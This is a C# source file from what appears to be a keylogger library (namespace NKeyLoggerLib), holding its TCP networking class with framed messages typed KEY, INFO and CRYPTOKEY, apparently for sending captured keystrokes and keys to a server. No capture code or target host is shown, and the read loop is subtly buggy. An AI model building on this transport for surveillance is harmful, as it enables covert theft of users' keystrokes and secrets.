using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;

namespace NKeyLoggerLib;

public class Network : IDisposable
{
    private const int CHECK_CONNECTION_ELIPSE = 10000;
    public Socket socket { get; } = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    private readonly System.Timers.Timer disconnectCheckTimer = new System.Timers.Timer(CHECK_CONNECTION_ELIPSE);
    private const int readBlockSize = 0x100;

    public Network(Socket socket) : this()
    {
        this.socket = socket;
    }

    public Network()
    {
        disconnectCheckTimer.Elapsed += onCheckDisconnect;
        disconnectCheckTimer.Start();
    }
    ~Network()
    {
        Dispose();
    }

    private void onCheckDisconnect(object? sender, System.Timers.ElapsedEventArgs e)
    {
        disconnectCheckTimer.Stop();
        if (!isConnected())
        {
            disconnected?.Invoke(this);
            disconnectCheckTimer.Stop();
            return;
        }
        disconnectCheckTimer.Start();
    }

    public bool isConnected()
    {
        if (!socket.Connected)
            return false;

        try
        {
            if (socket.Poll(0, SelectMode.SelectRead))
            {
                var buffer = new byte[1];
                if (socket.Receive(buffer, 0, SocketFlags.Peek) == 0)
                    return false;
            }
            return true;
        } catch (SocketException)
        {
            return false;
        }
    }
    private async Task<List<byte>> readAsync(long total)
    {
        if (socket == null)
            throw new ArgumentNullException("Socket is null");

        List<byte> result = new List<byte>();
        long bufferSize = (total > readBlockSize) ? readBlockSize : total;
        byte[] buffer = new byte[bufferSize];
        long i = 0;
        while( i < total)
        {
            int readed = await socket.ReceiveAsync(buffer);
            result.AddRange(buffer);
            i += readed;
        }
        return result;
    }

    public async Task sendAsync(byte[] data, Type type)
    {
        if (socket == null)
            throw new ArgumentNullException("Socket is null");

        using MemoryStream stream = new MemoryStream();
        using BinaryWriter writer = new BinaryWriter(stream);
        writer.Write(BitConverter.GetBytes(data.Length));
        writer.Write(BitConverter.GetBytes((short)type));
        writer.Write(data);
        writer.Flush();
        await socket.SendAsync(stream.ToArray());
    }
    public async Task<(List<byte>data, Type type)> recvAsync()
    {
        List<byte> byteSize = await readAsync(sizeof(int));
        List<byte> byteType = await readAsync(sizeof(short));
        Type type = (Type)BitConverter.ToInt16(byteType.ToArray());
        int size = BitConverter.ToInt32( byteSize.ToArray() );
        List<byte> data = await readAsync(size);
        return (data, type);
    }

    public string getAddress()
    {
        try
        {
            return ((IPEndPoint)socket.RemoteEndPoint!).Address.ToString();
        } catch (ObjectDisposedException e)
        {
            return "";
        }
    }
    public void Dispose()
    {
        try
        {
            disconnectCheckTimer.Stop();
            disconnectCheckTimer.Close();
            socket.Shutdown(SocketShutdown.Both);
        }
        catch (Exception) { }
        finally
        {
            socket.Close();
        }
    }

    public override int GetHashCode()
    {
        return socket.GetHashCode();
    }

    public enum Type : short
    {
        KEY = 0,
        INFO = 1,
        CRYPTOKEY = 2,
    }

    public delegate void DisconnectedDelegate(Network sender);
    public event DisconnectedDelegate? disconnected;
}
